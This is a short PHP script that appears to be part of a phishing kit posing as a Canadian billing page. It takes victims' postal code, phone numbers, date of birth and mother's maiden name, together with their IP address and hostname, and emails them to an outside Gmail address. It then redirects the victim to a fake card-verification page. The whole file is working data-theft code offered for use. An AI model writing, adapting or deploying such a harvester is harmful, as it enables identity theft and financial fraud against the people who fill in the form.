<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message ."====+++ CANADA BILLING  RESULTAT +++====\n";
$message .= "POSTAL CODE:".$_POST['zip']."\n";
$message .= "Number Phone: ".$_POST['tel']."\n";
$message .= "Home Phone: ".$_POST['telmaison']."\n";
$message .= "DOB  (DD/MM/YYYY: ".$_POST['daya']." /	".$_POST['montha']."	/ ".$_POST['yeara']."\n";
$message .= "Mother MaidName : ".$_POST['mok']."\n";
$message .= "======+ END +=======\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "======+ END +=======\n";
$send = "nabilwind5974@gmail.com";
$subject = "BILLING [".$_POST['zip']."]  $ip";
$headers = "From:  <resultat@okby.com>";

mail($send,$subject,$message,$headers);
header("Location: vbv.php");

?>